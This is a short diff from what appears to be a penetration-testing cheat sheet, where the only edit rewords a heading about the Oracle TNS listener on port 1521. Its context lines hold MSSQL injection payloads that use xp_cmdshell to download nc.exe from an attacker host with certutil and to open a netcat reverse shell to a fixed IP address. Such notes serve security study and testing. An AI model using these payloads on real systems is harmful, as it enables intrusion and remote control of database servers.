@@ -232,7 +232,7 @@ param=';EXEC xp_cmdshell 'certutil.exe -urlcache -split -f http://[kali]/nc.exe'
 param=';EXEC xp_cmdshell 'nc 192.168.119.210 443 -e cmd.exe'--    # initiate reverse shell connection
 ```
 
-### Oracle TNS Listener - indicator of OracleDB [1521 TCP]
+### Oracle TNS Listener (indicator of OracleDB) [1521 TCP]
 
 OracleDB injection
 ```
